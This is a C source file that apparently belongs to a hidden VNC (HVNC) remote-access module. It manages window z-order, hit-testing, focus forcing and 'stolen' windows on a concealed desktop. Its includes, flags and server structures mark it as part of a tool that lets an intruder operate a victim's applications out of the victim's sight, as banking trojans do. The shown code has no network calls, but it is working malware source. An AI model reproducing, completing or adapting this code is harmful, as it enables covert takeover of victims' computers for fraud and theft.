#include "..\includes.h"
#include "windows.h"
#include "wnd_steal.h"
#include "mou.h"
#include "events.h"
#include "vnc.h"

HWND FindWnd(HWND hParent,TCHAR *lpClass,TCHAR *lpText)
{
    HWND hWnd;
    int i=0;
    while (!(hWnd=FindWindowEx(hParent,NULL,lpClass,lpText)))
    {
        if (i++ > 40)
            break;
        Sleep(2);
    }
    return hWnd;
}

_MessageBoxTimeout MessageBoxTimeout;

WND_CLASS_INFO wciInfo[]={{HASH_MENU,WCF_MOUSE_CLIENT_TO_SCREEN+WCF_MOUSE_AUTOCAPTURE+WCF_MENU},
                          {HASH_MOZILLAMENU,WCF_MOUSE_AUTOCAPTURE+WCF_MENU},
                          {HASH_QPOPUP,WCF_MOUSE_AUTOCAPTURE+WCF_MENU},
                          {HASH_BASEBAR,WCF_MOUSE_AUTOCAPTURE+WCF_MENU+WCF_STARTMENU},
                          {HASH_TOOLTIP32,WCF_NO_CAPTURE},
                          {HASH_DESK,WCF_PAINT_ALWAYS_BOTTOM},
                          {HASH_STARMENU,WCF_MOUSE_AUTOCAPTURE+WCF_MENU+WCF_NEVERCLOSE+WCF_STARTMENU},
                          {HASH_SYSSHADOW,WCF_IGNOREWINDOW},
                          {HASH_WORKERW,WCF_PAINT_ALWAYS_BOTTOM},
                          {HASH_AWTFRAME,WCF_JAVA},
                          {HASH_AWTDIALOG,WCF_JAVA},
                          {HASH_AWTCANVAS,WCF_JAVA},
                          {HASH_IME,WCF_IGNOREWINDOW},
                          {HASH_MSCTFIMEUI,WCF_IGNOREWINDOW},
                          {HASH_GDIPHOOKWND,WCF_IGNOREWINDOW},
                          {HASH_AUTOSUGGEST,WCF_IGNOREWINDOW}};

void GetOwner(PHVNC lpServer,Z_ORDER_LIST_ITEM *lpWnd)
{
    HWND hParent=GetWindow(lpWnd->hWnd,GW_OWNER),hTopPopup=GetTopPopupWindow(lpServer,hParent);
    if ((hTopPopup) && (hTopPopup == lpWnd->hWnd))
        lpWnd->lpOwner=GetWndFromList(lpServer,hParent);
    return;
}

bool IsAltTabItem(WINDOWINFO *lpWndInfo)
{
    return ((!(lpWndInfo->dwStyle & WS_MINIMIZE)) && (!(lpWndInfo->dwStyle & WS_CHILD)) && (lpWndInfo->dwStyle & WS_VISIBLE) && (!(lpWndInfo->dwExStyle & WS_EX_TRANSPARENT)) && ((lpWndInfo->dwStyle & WS_OVERLAPPEDWINDOW) || (lpWndInfo->dwStyle & WS_POPUPWINDOW)) && (!(lpWndInfo->dwExStyle & WS_EX_TOOLWINDOW)) && (!(lpWndInfo->dwStyle & WS_DISABLED)));
}

int GetClassHash(HWND hWnd)
{
    char szClassName[256+1];
    return chksum_crc32((byte*)szClassName,GetClassNameA(hWnd,szClassName,sizeof(szClassName)));
}

bool IsWindowVisibleEx(PHVNC lpServer,HWND hWnd)
{
    bool bRet=false;
    if (IsStolenWindow(lpServer,hWnd))
        bRet=IsStolenWindowVisible(lpServer,hWnd);
    else
        bRet=IsWindowVisible(hWnd);
    return ((bRet) && (!(GetWindowLongPtr(hWnd,GWL_EXSTYLE) & WS_EX_TRANSPARENT)));
}

bool IsWindowEx(PHVNC lpServer,HWND hWnd)
{
    bool bRet=false;
    if (IsWindow(hWnd))
    {
        HDESK hThreadDesktop=GetThreadDesktop(GetWindowThreadProcessId(hWnd,NULL));
        bRet=(CompareObjects(GetThreadDesktop(GetCurrentThreadId()),hThreadDesktop) == 0);
        if (!bRet)
            bRet=IsStolenWindow(lpServer,hWnd);

        if (bRet)
        {
            bRet=(!(GetWindowClassFlags(lpServer,hWnd) & WCF_IGNOREWINDOW));
            if (bRet)
                bRet=(!(GetWindowClassFlags(lpServer,GetAncestor(hWnd,GA_ROOT)) & WCF_IGNOREWINDOW));
        }
    }
    return bRet;
}

void SetThreadDesktopEx(HDESK hDesktop)
{
    if (hDesktop)
        SetThreadDesktop(hDesktop);
    return;
}

WORD GetWindowClassFlags(PHVNC lpServer,HWND hWnd)
{
    int dwClassHash=GetClassHash(hWnd);
    WORD wFlags=0;

    if (dwClassHash)
    {
#ifndef _INJLIB
        if (IsStolenWindow(lpServer,hWnd))
            wFlags=WCF_STOLENWINDOW;
#endif
        for (DWORD i=0; i < countof(wciInfo); i++)
        {
            if (dwClassHash == wciInfo[i].dwClassHash)
            {
                wFlags|=wciInfo[i].wMethod;
                break;
            }
        }
        if (dwClassHash == HASH_IESERVER)
        {
            HWND hParent=GetParent(hWnd);
            if (hParent == lpServer->WndsInfo.hDefView)
                wFlags|=WCF_IGNOREWINDOW;
        }
    }
    return wFlags;
}

HWND GetTopPopupWindow(PHVNC lpServer,HWND hWnd)
{
    if ((IsWindowEx(lpServer,hWnd)) && (hWnd != lpServer->WndsInfo.hShellWnd))
    {
        if (GetWindowLongPtr(hWnd,GWL_STYLE) & WS_DISABLED)
        {
            HWND hPopup=GetLastActivePopup(hWnd);
            if ((hPopup) && (hPopup != hWnd))
                return hPopup;

            HWND hCurWnd=GetWindow(GetWindow(lpServer->WndsInfo.hDeskWnd,GW_CHILD),GW_HWNDLAST);
            do
            {
                WINDOWINFO wiInfo;
                wiInfo.cbSize=sizeof(WINDOWINFO);
                GetWindowInfo(hCurWnd,&wiInfo);
                if ((GetWindow(hCurWnd,GW_OWNER) == hWnd) &&
                    (wiInfo.dwStyle & WS_VISIBLE) &&
                    (!(wiInfo.dwStyle & WS_MINIMIZE)) &&
                    (!(wiInfo.dwStyle & WS_EX_TRANSPARENT)) &&
                    ((wiInfo.dwExStyle & WS_EX_DLGMODALFRAME) || (wiInfo.dwStyle & (WS_DLGFRAME/**|WS_OVERLAPPEDWINDOW*/|WS_POPUPWINDOW))))
                {
                    WORD wFlags=GetWindowClassFlags(lpServer,hCurWnd);
                    if ((!(wFlags & WCF_MOUSE_AUTOCAPTURE)) && (!(wFlags & WCF_PAINTMETHOD_NOP)) && (hCurWnd != hWnd))
                        return hCurWnd;
                }
            }
            while (hCurWnd=GetWindow(hCurWnd,GW_HWNDPREV));

            hWnd=GetTopPopupWindow(lpServer,GetWindow(hWnd,GW_OWNER));
            if (!hWnd)
                hWnd=lpServer->WndsInfo.hDeskWnd;
            return hWnd;
        }
    }
    return NULL;
}

bool CheckWindowStyle(PHVNC lpServer,HWND hWnd)
{
    return ((!(GetWindowLongPtr(hWnd,GWL_STYLE) & WS_CHILD)) && (IsWindowVisibleEx(lpServer,hWnd)) && (!IsIconic(hWnd)));
}

void SetForegroundWnd(PHVNC lpServer,HWND hWnd)
{
    if (IsWindowEx(lpServer,hWnd))
    {
        HWND hwndForeground=lpServer->lpGlobalVNCData->hForegroundWnd;

        if (hwndForeground != hWnd)
        {
            if ((CheckWindowStyle(lpServer,hWnd)) && (!(GetWindowClassFlags(lpServer,hWnd) & (WCF_NO_CAPTURE|WCF_PAINTMETHOD_NOP|WCF_MOUSE_AUTOCAPTURE))))
            {
                ChangeMouseCapture(lpServer,GetWindowThreadProcessId(hWnd,NULL),hWnd,HTNOWHERE,true);

                DWORD dwFGProcessId,
                      dwFGThreadId=GetWindowThreadProcessId(hwndForeground,&dwFGProcessId),
                      dwThisThreadId=GetCurrentThreadId();
                AttachThreadInput(dwThisThreadId,dwFGThreadId,TRUE);
                SetForegroundWindow(hWnd);
                BringWindowToTop(hWnd);
                SetFocus(hWnd);
                AttachThreadInput(dwThisThreadId,dwFGThreadId,FALSE);

                if ((!(lpServer->DeskInfo.dwFlags & HVNC_NO_WINDOWS_MANIPULATION_TRICK)) && (!(IsStolenWindow(lpServer,hWnd))))
                {
                    ///g_enter(hPaintMutex)
                    {
                        lpServer->WndWatcherInfo.bMessageBoxIsShown=true;
                        MessageBoxTimeout(hWnd,NULL,HVNC_MSG_TITLE,MB_OK+MB_SETFOREGROUND+MB_SYSTEMMODAL+MB_ICONINFORMATION,0,1);
                        lpServer->WndWatcherInfo.bMessageBoxIsShown=false;
                    }
                    ///g_leave(hPaintMutex)
                    SetWindowPos(hWnd,HWND_TOP,0,0,0,0,SWP_NOMOVE|SWP_NOSIZE);
                }
                else
                {
                    EnterCriticalSection(&lpServer->WndWatcherInfo.csWndsList);
                        SetFrgWnd(lpServer,hWnd);
                    LeaveCriticalSection(&lpServer->WndWatcherInfo.csWndsList);
                    lpServer->lpGlobalVNCData->hForegroundWnd=hWnd;
                }
            }
        }
    }
    return;
}

void SetFrgWnd(PHVNC lpServer,HWND hWnd)
{
    if ((lpServer->DeskInfo.dwFlags & HVNC_NO_WINDOWS_MANIPULATION_TRICK) || (lpServer->lpGlobalVNCData->hForegroundWnd == hWnd))
        return;

    Z_ORDER_LIST_ITEM *lpWnd;
    if ((CheckWindowStyle(lpServer,hWnd)) && (!(GetWindowClassFlags(lpServer,hWnd) & (WCF_NO_CAPTURE|WCF_PAINT_ALWAYS_BOTTOM|WCF_PAINTMETHOD_NOP))) && (lpWnd=GetWndFromList(lpServer,hWnd)) && (lpWnd->lpNext))
    {
        if (lpWnd->lpOwner)
            SetFrgWnd(lpServer,lpWnd->lpOwner->hWnd);

        Z_ORDER_LIST_ITEM *lpPrevFrg=lpServer->WndWatcherInfo.lpZOrderList;
        while (lpPrevFrg->lpNext)
            lpPrevFrg=lpPrevFrg->lpNext;
        if (lpWnd != lpPrevFrg)
        {
            Z_ORDER_LIST_ITEM *lpPrev=lpWnd->lpPrev,
                              *lpNext=lpWnd->lpNext;

            if (lpNext)
                lpNext->lpPrev=lpPrev;

            if (lpPrev)
                lpPrev->lpNext=lpNext;
            else
                lpServer->WndWatcherInfo.lpZOrderList=lpNext;

            lpPrevFrg->lpNext=lpWnd;
            lpWnd->lpPrev=lpPrevFrg;
            lpWnd->lpNext=NULL;
            ///IsWindowOverlapped(lpWnd);
        }
    }
    return;
}

Z_ORDER_LIST_ITEM *AppendWndToList(PHVNC lpServer,HWND hWnd,bool bStolen)
{
    Z_ORDER_LIST_ITEM *lpWnd=0;
    if ((((bStolen) && (IsWindow(hWnd))) || (IsWindowEx(lpServer,hWnd))) && (!(GetWindowClassFlags(lpServer,hWnd) & WCF_PAINTMETHOD_NOP)))
    {
        if (!lpServer->WndWatcherInfo.lpZOrderList)
            lpWnd=lpServer->WndWatcherInfo.lpZOrderList=(Z_ORDER_LIST_ITEM*)MemAlloc(sizeof(Z_ORDER_LIST_ITEM));
        else
        {
            lpWnd=lpServer->WndWatcherInfo.lpZOrderList;
            Z_ORDER_LIST_ITEM *lpPrev;
            while (lpWnd)
            {
                if (lpWnd->hWnd == hWnd)
                    return lpWnd;
                lpPrev=lpWnd;
                lpWnd=lpWnd->lpNext;
            }
            lpWnd=lpPrev->lpNext=(Z_ORDER_LIST_ITEM*)MemAlloc(sizeof(Z_ORDER_LIST_ITEM));
            lpWnd->lpPrev=lpPrev;
        }
        lpWnd->hWnd=hWnd;
        WINDOWINFO wiInfo;
        wiInfo.cbSize=sizeof(WINDOWINFO);
        GetWindowInfo(hWnd,&wiInfo);
        lpWnd->bAltTabItem=IsAltTabItem(&wiInfo);
        memcpy(&lpWnd->rect,&wiInfo.rcWindow,sizeof(wiInfo.rcWindow));
        GetOwner(lpServer,lpWnd);
    }
    return lpWnd;
}

void DeleteWndFromList(PHVNC lpServer,HWND hWnd)
{
    Z_ORDER_LIST_ITEM *lpWnd=GetWndFromList(lpServer,hWnd);
    if (lpWnd)
    {
        Z_ORDER_LIST_ITEM *lpPrev=lpWnd->lpPrev,
                          *lpNext=lpWnd->lpNext;
        if (lpPrev)
            lpPrev->lpNext=lpNext;
        else
            lpServer->WndWatcherInfo.lpZOrderList=lpNext;

        if (lpNext)
            lpNext->lpPrev=lpPrev;
        else
        {
            Z_ORDER_LIST_ITEM *lpItem=lpPrev;
            HWND hPrevWnd=NULL;
            EnterCriticalSection(&lpServer->WndWatcherInfo.csWndsList);
            {
                while (lpItem)
                {
                    hWnd=lpItem->hWnd;
                    if ((IsWindowEx(lpServer,hWnd)) && (CheckWindowStyle(lpServer,hWnd)) && (!(GetWindowClassFlags(lpServer,hWnd) & (WCF_NO_CAPTURE|WCF_PAINT_ALWAYS_BOTTOM|WCF_PAINTMETHOD_NOP))))
                    {
                        hPrevWnd=hWnd;
                        break;
                    }
                    lpItem=lpItem->lpPrev;
                }
            }
            LeaveCriticalSection(&lpServer->WndWatcherInfo.csWndsList);

            if (hPrevWnd)
                SetForegroundWnd(lpServer,hPrevWnd);
        }
        MemFree(lpWnd);
    }
    return;
}

Z_ORDER_LIST_ITEM *GetWndFromList(PHVNC lpServer,HWND hWnd)
{
    Z_ORDER_LIST_ITEM *lpWnd=lpServer->WndWatcherInfo.lpZOrderList;
    while (lpWnd)
    {
        if (lpWnd->hWnd == hWnd)
            return lpWnd;
        lpWnd=lpWnd->lpNext;
    }
    return NULL;
}

#ifndef _INJLIB
void DestroyMenus(PHVNC lpServer,HWND hWnd)
{
    if (lpServer->DeskInfo.dwFlags & HVNC_NO_WINDOWS_MANIPULATION_TRICK)
        return;

    bool bStartMenu=(((GetWindowClassFlags(lpServer,hWnd) & WCF_STARTMENU) || (GetWindowClassFlags(lpServer,GetAncestor(hWnd,GA_ROOT)) & WCF_STARTMENU)) && (bXP));
    if ((bStartMenu) || (GetWindowClassFlags(lpServer,hWnd) & WCF_MENU))
        return;

    HWND hCurWnd=GetWindow(GetWindow(lpServer->WndsInfo.hDeskWnd,GW_CHILD),GW_HWNDLAST);
    do
    {
        if (IsWindowVisibleEx(lpServer,hCurWnd))
        {
            LONG_PTR dwStyle=GetWindowLongPtr(hCurWnd,GWL_STYLE),
                     dwFlags=GetWindowClassFlags(lpServer,hCurWnd);
            HWND hParent=GetAncestor(hCurWnd,GA_ROOT);
            if ((dwFlags & WCF_MENU) && (hCurWnd != hWnd) && (hParent != hWnd) &&
                ((!bStartMenu) || (!(((GetWindowClassFlags(lpServer,hCurWnd) & WCF_STARTMENU)) || (GetWindowClassFlags(lpServer,hCurWnd) & WCF_STARTMENU)))))
            {
                if ((!(dwFlags & WCF_NEVERCLOSE)) || (bXP))
                    PostMessage(hCurWnd,WM_CLOSE,0,0);
                else
                    ShowWindow(hCurWnd,SW_HIDE);
            }
            else if (dwStyle & WS_CHILD)
                ShowWindow(hCurWnd,SW_HIDE);
        }
    }
    while (hCurWnd=GetWindow(hCurWnd,GW_HWNDPREV));
    return;
}

void IsWindowOverlapped(PHVNC lpServer,Z_ORDER_LIST_ITEM *lpWnd)
{
    Z_ORDER_LIST_ITEM *lpNext=lpWnd->lpNext;
    bool bOverlapped=false;
    RECT rcCurWnd=lpWnd->rect;
    while (lpNext)
    {
        if ((IsWindowVisibleEx(lpServer,lpNext->hWnd)) && (!IsIconic(lpNext->hWnd)))
        {
            if ((rcCurWnd.left >= lpNext->rect.left) && (rcCurWnd.bottom <= lpNext->rect.bottom) &&
                (rcCurWnd.right <= lpNext->rect.right) && (rcCurWnd.top >= lpNext->rect.top))
            {
                if (((lpWnd->bTopMost) && (lpNext->bTopMost)) || (!lpWnd->bTopMost))
                {
                    bOverlapped=true;
                    break;
                }
            }
            if (IsFullScreen(lpNext->hWnd))
            {
                lpNext->bTopMost=true;
                bOverlapped=true;
                break;
            }
        }
        lpNext=lpNext->lpNext;
    }
    lpWnd->bOverlapped=bOverlapped;
    return;
}

void RefreshList(PHVNC lpServer)
{
    SetFrgWnd(lpServer,lpServer->lpGlobalVNCData->hForegroundWnd);
    Z_ORDER_LIST_ITEM *lpWnd=lpServer->WndWatcherInfo.lpZOrderList;

    while (lpWnd)
    {
        GetOwner(lpServer,lpWnd);

        WINDOWINFO wiInfo;
        wiInfo.cbSize=sizeof(WINDOWINFO);
        HWND hWnd=lpWnd->hWnd;

        if ((IsWindowEx(lpServer,hWnd)) && (GetWindowInfo(hWnd,&wiInfo)))
        {
            lpWnd->bTopMost=((wiInfo.dwExStyle & WS_EX_TOPMOST) != 0);
            if (!lpWnd->bTopMost)
            {
                lpWnd->bTopMost=((GetWindowClassFlags(lpServer,hWnd) & WCF_PAINT_ON_TOP) != 0);
                if (!lpWnd->bTopMost)
                    lpWnd->bTopMost=(((wiInfo.dwExStyle & WS_EX_TOOLWINDOW) != 0) && (wiInfo.dwStyle & WS_CHILD));
                if (!lpWnd->bTopMost)
                    lpWnd->bTopMost=IsFullScreen(lpWnd->hWnd);
            }
            else
                lpWnd->bTopMost=((GetWindowClassFlags(lpServer,hWnd) & WCF_PAINT_ALWAYS_BOTTOM) == 0);

            memcpy(&lpWnd->rect,&wiInfo.rcWindow,sizeof(wiInfo.rcWindow));
            IsWindowOverlapped(lpServer,lpWnd);
            lpWnd->bHidden=(IsWindowVisibleEx(lpServer,hWnd) == false);
            lpWnd->bAltTabItem=IsAltTabItem(&wiInfo);

            lpWnd=lpWnd->lpNext;
        }
        else
        {
            DeleteWndFromList(lpServer,hWnd);
            lpWnd=lpServer->WndWatcherInfo.lpZOrderList;
        }
    }
    return;
}

BOOL CALLBACK FindBestChildProc(HWND hWnd,LPARAM lParam)
{
    CURSOR_INFO *lpCurInfo=(CURSOR_INFO*)lParam;

    RECT rcWindow;
    GetWindowRect(hWnd,&rcWindow);

	if (PtInRect(&rcWindow,lpCurInfo->pt))
	{
        if (IsWindowVisible(hWnd))
        {
            DWORD dwArea=(rcWindow.right-rcWindow.left)*(rcWindow.bottom-rcWindow.top);
            if ((dwArea == lpCurInfo->dwArea) && (GetParent(hWnd) == lpCurInfo->hGlobalWnd))
                lpCurInfo->dwArea++;
            if (dwArea < lpCurInfo->dwArea)
            {
                lpCurInfo->dwArea=dwArea;
                lpCurInfo->hGlobalWnd=hWnd;
            }
        }
	}
	return TRUE;
}

HWND FindBestChild(PHVNC lpServer,HWND hWnd,POINT pt)
{
	HWND hParent=GetParent(hWnd);

	if ((!hParent) || (GetWindowLong(hWnd,GWL_STYLE) & WS_POPUP))
		hParent=hWnd;

    CURSOR_INFO ciCursor;
    ciCursor.dwArea=-1;
    ciCursor.pt=pt;
    ciCursor.hGlobalWnd=NULL;
    ciCursor.lpServer=lpServer;
	EnumChildWindows(hParent,FindBestChildProc,(LPARAM)&ciCursor);

	if (!ciCursor.hGlobalWnd)
		ciCursor.hGlobalWnd=hWnd;

	return ciCursor.hGlobalWnd;
}

bool IsMDI(HWND hWnd)
{
    char szClass[200];
    while (hWnd)
    {
        GetClassNameA(GetParent(hWnd),szClass,sizeof(szClass));
        if (!lstrcmpiA(szClass,"mdiclient"))
            return true;
        hWnd=GetParent(hWnd);
    }
    return false;
}

HWND WindowFromPointEx(PHVNC lpServer,POINT pt)
{
    HWND hWnd;
    EnterCriticalSection(&lpServer->WndWatcherInfo.csWndsList);
    {
        hWnd=ChildWindowFromPointEx(lpServer->WndsInfo.hDeskWnd,pt,CWP_SKIPDISABLED+CWP_SKIPINVISIBLE+CWP_SKIPTRANSPARENT);
        Z_ORDER_LIST_ITEM *lpWnd=GetWndFromList(lpServer,hWnd),*lpCurWnd=lpWnd;
        if (lpWnd)
        {
            bool bTopMost=lpWnd->bTopMost;
            while (lpWnd=lpWnd->lpNext)
            {
                if ((!lpWnd->bHidden) && (!lpWnd->bOverlapped) && (lpWnd->bTopMost >= bTopMost) && (!(GetWindowClassFlags(lpServer,lpWnd->hWnd) & WCF_PAINT_ALWAYS_BOTTOM)))
                {
                    if (PtInRect(&lpWnd->rect,pt))
                        hWnd=lpWnd->hWnd;
                }
            }
        }
        hWnd=FindBestChild(lpServer,hWnd,pt);
    }
    LeaveCriticalSection(&lpServer->WndWatcherInfo.csWndsList);
    return hWnd;
}

HWND _WindowFromPoint(PHVNC lpServer,POINT pt,WORD *dwHitTest,WORD wDeep)
{
    if (lpServer->DeskInfo.dwFlags & HVNC_NO_WINDOWS_MANIPULATION_TRICK)
    {
        HWND hWnd=WindowFromPoint(pt);
        if (dwHitTest)
        {
            DWORD dwResult;
            SendMessageTimeout(hWnd,WM_NCHITTEST,0,MAKELPARAM(pt.x,pt.y),SMTO_ABORTIFHUNG+SMTO_NORMAL,100,&dwResult);
            *dwHitTest=(WORD)dwResult;
        }
        return hWnd;
    }

    HWND hWnd=WindowFromPointEx(lpServer,pt);
    if (hWnd)
    {
        /**if ((hWnd == hTakSwWnd) || (hWnd == hMSTaskListWnd) || (hWnd == hToolBarWnd) || (hWnd == hTakSwRebarWnd))
            hWnd=RealChildWindowFromPoint(hDeskWnd,pt);*/

        if (hWnd == lpServer->WndsInfo.hTrayNotifyWnd)
        {
            if (dwHitTest)
                *dwHitTest=HTCLIENT;
            return lpServer->WndsInfo.hTrayUserNotifyToolbarWnd;
        }
        if ((hWnd == lpServer->WndsInfo.hTrayUserNotifyToolbarWnd) || (hWnd == lpServer->WndsInfo.hTraySystemNotifyToolbarWnd)|| (hWnd == lpServer->WndsInfo.hTrayUserNotifyOverflowToolbarWnd))
        {
            if (dwHitTest)
                *dwHitTest=HTCLIENT;
            return hWnd;
        }

        if (hWnd == lpServer->WndsInfo.hTakSwWnd)
            hWnd=RealChildWindowFromPoint(lpServer->WndsInfo.hDeskWnd,pt);
        else if (hWnd == lpServer->WndsInfo.hToolBarWnd)
        {
            POINT cli_pt=pt;
            ScreenToClient(lpServer->WndsInfo.hToolBarWnd,&cli_pt);
            int dwBtn=SendMessage(lpServer->WndsInfo.hToolBarWnd,lpServer->lpGlobalVNCData->dwVNCMessage,VMW_TBHITTEST,MAKELPARAM(cli_pt.x,cli_pt.y));
            if (dwHitTest)
                *dwHitTest=HTCLIENT;
            if (dwBtn < 0)
                hWnd=lpServer->WndsInfo.hTakSwRebarWnd;
            return hWnd;
        }

        DWORD_PTR dwResult;
        if (SendMessageTimeout(hWnd,WM_NCHITTEST,0,MAKELPARAM(pt.x,pt.y),SMTO_ABORTIFHUNG+SMTO_NORMAL,100,&dwResult))
        {
            if ((dwResult == HTTRANSPARENT) && (!wDeep))
            {
                ///g_enter(hPaintMutex)
                {
                    HWND hCurWnd=hWnd;
                    SetWindowLongPtr(hCurWnd,GWL_STYLE,GetWindowLongPtr(hCurWnd,GWL_STYLE) | WS_DISABLED);
                    hWnd=_WindowFromPoint(lpServer,pt,dwHitTest,1);
                    SetWindowLongPtr(hCurWnd,GWL_STYLE,GetWindowLongPtr(hCurWnd,GWL_STYLE) & ~WS_DISABLED);
                }
                ///g_leave(hPaintMutex)
            }
            else
            {
                HWND hParent=GetAncestor(hWnd,GA_ROOT),
                     hForegroundWnd=lpServer->lpGlobalVNCData->hForegroundWnd;

                if ((hParent != hForegroundWnd) && (hParent != lpServer->WndsInfo.hShellWnd) && (!(GetWindowClassFlags(lpServer,hForegroundWnd) & WCF_PAINT_ALWAYS_BOTTOM)))
                {
                    if ((!(GetWindowLongPtr(hWnd,GWL_STYLE) & WS_CHILD))/** || (!(GetWindowLongPtr(hWnd,GWL_EXSTYLE) & WS_EX_TOOLWINDOW))**/)
                    {
                        WINDOWINFO wiInfo;
                        wiInfo.cbSize=sizeof(WINDOWINFO);
                        GetWindowInfo(hForegroundWnd,&wiInfo);
                        if ((wiInfo.dwStyle & WS_VISIBLE) && (!(wiInfo.dwStyle & WS_MINIMIZE)))
                        {
                            if (PtInRect(&wiInfo.rcWindow,pt))
                            {
                                if (!(GetWindowClassFlags(lpServer,hWnd) & WCF_MOUSE_AUTOCAPTURE))
                                {
                                    LONG_PTR dwStyle=GetWindowLongPtr(hWnd,GWL_STYLE);
                                    if (dwStyle & (WS_POPUPWINDOW|WS_OVERLAPPEDWINDOW))
                                    {
                                        if (!SendMessageTimeout(hWnd,WM_NCHITTEST,0,MAKELPARAM(pt.x,pt.y),SMTO_ABORTIFHUNG+SMTO_NORMAL,100,&dwResult))
                                            hWnd=NULL;
                                        if (dwResult == HTCLIENT)
                                        {
                                            HWND hChild=hForegroundWnd;
                                            hParent=lpServer->WndsInfo.hDeskWnd;
                                            POINT cli_pt=pt;
                                            while (true)
                                            {
                                                MapWindowPoints(hParent,hChild,&cli_pt,1);
                                                HWND hWnd=RealChildWindowFromPoint(hChild,cli_pt);
                                                if ((!hWnd) || (hWnd == hChild))
                                                    break;
                                                hParent=hChild;
                                                hChild=hWnd;
                                            }
                                            hWnd=hChild;
                                        }
                                        else
                                            hWnd=hForegroundWnd;
                                    }
                                }
                            }
                        }
                        else
                        {
                            SetForegroundWnd(lpServer,hParent);
                            return hWnd;
                        }
                    }
                }
                if (dwHitTest)
                    *dwHitTest=(WORD)dwResult;
            }
        }
        else
            hWnd=NULL;
    }
    return hWnd;
}

bool IsStyleHaveSizeBorders(LONG_PTR dwStyle)
{
    return ((((dwStyle & WS_CAPTION) == WS_CAPTION) || (dwStyle & (WS_POPUP|WS_THICKFRAME))) != 0);
}

HWND GetWindowFocus(HWND hWnd)
{
    GUITHREADINFO gtiInfo={0};
    gtiInfo.cbSize=sizeof(gtiInfo);
    GetGUIThreadInfo(GetWindowThreadProcessId(hWnd,NULL),&gtiInfo);
    return gtiInfo.hwndFocus;
}

void SendMessageBroadcast(PHVNC lpServer,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
    SetThreadDesktopEx(lpServer->hDesktop);
    HWND hNextWnd=GetWindow(GetWindow(lpServer->WndsInfo.hDeskWnd,GW_CHILD),GW_HWNDLAST);
    do
        SendMessage(hNextWnd,uMsg,wParam,lParam);
    while (hNextWnd=GetWindow(hNextWnd,GW_HWNDPREV));
    return;
}

bool IsWindowInFullScreenMode(PHVNC lpServer,HWND hWnd)
{
    bool bRet=false;
    if ((IsWindowEx(lpServer,hWnd)) && (IsWindowVisibleEx(lpServer,hWnd)))
    {
        RECT rcWindow;
        GetWindowRect(hWnd,&rcWindow);
        if ((!rcWindow.top) && (!rcWindow.left) && (lpServer->DeskInfo.dwHeight <= rcWindow.bottom) && (lpServer->DeskInfo.dwWidth <= rcWindow.right))
            bRet=true;
    }
    return bRet;
}
#endif
